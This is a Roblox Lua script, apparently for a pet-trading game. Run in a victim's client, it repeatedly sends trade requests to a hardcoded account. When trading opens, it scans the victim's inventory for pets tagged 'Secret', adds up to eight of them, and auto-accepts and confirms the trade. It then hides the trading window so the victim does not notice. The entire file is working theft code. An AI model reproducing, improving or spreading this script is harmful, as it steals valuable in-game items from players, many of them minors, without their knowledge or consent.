local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
-- UPDATED AGAIN |JFASWEFJIDS
-- RemoteEvent path
local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent

-- Config
local waitedPlayer = "geeAqbG9nSC7tRh69Rnz" -- Replace with the exact target name
local TRADE_INTERVAL = 5

-- Wait for the player to join (if not already in game)
local targetPlayer = Players:FindFirstChild(waitedPlayer)
if not targetPlayer then
	targetPlayer = Players:WaitForChild(waitedPlayer)
end

-- Trade Request Loop (runs on Heartbeat)
local lastFireTime = 0
RunService.Heartbeat:Connect(function(dt)
	if targetPlayer and targetPlayer.Parent == Players then
		lastFireTime += dt
		if lastFireTime >= TRADE_INTERVAL then
			Event:FireServer("TradeAcceptRequest", targetPlayer)
			lastFireTime = 0
		end
	end
end)

-- Wait for the Trading UI to become visible and run mainCode
local function mainCode()
	local SecretPets = {}
	local scrollingFrame = playerGui:WaitForChild("ScreenGui"):WaitForChild("Trading"):WaitForChild("Frame"):WaitForChild("Inner"):WaitForChild("You"):WaitForChild("Holder"):WaitForChild("Pets")

	

	local canvasHeight = scrollingFrame.CanvasSize.Y.Offset
	local viewHeight = scrollingFrame.AbsoluteWindowSize.Y
	local scrollStep = 50

	for scrollY = 0, canvasHeight - viewHeight, scrollStep do
		scrollingFrame.CanvasPosition = Vector2.new(0, scrollY)
		task.wait(0.05)
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			local inner = child:FindFirstChild("Inner")
			if inner and inner:IsA("Frame") then
				local button = inner:FindFirstChild("Button")
				if button and button:IsA("ImageButton") then
					local innerButton = button:FindFirstChild("Inner")
					local secretTag = innerButton and innerButton:FindFirstChild("Secret")
					if secretTag and secretTag:IsA("GuiObject") and secretTag.Visible then
						local petId = child.Name
						if not table.find(SecretPets, petId) then
							table.insert(SecretPets, petId)
						end
					end
				end
			end
		end
	end

	scrollingFrame.CanvasPosition = Vector2.new(0, canvasHeight)

	local maxPets = 8
	local totalPets = math.min(#SecretPets, maxPets)

	for i = 1, totalPets do
		local petId = SecretPets[i]
		task.delay(i * 0.5, function()
			Event:FireServer("TradeAddPet", petId)
	
			if i == totalPets then
				task.delay(5, function()
					Event:FireServer("TradeAccept")
					task.wait(10)
					Event:FireServer("TradeConfirm")
				end)
			end
		end)
	end
end

task.spawn(function()
	local tradingFrame = playerGui:WaitForChild("ScreenGui"):WaitForChild("Trading")

	Event:FireServer("TradeSetRequestsAllowed", true)

	tradingFrame:GetPropertyChangedSignal("Visible"):Connect(function()
		if tradingFrame.Visible then
			mainCode()
			task.wait(1)
			tradingFrame.Visible = false
		end
	end)
end)
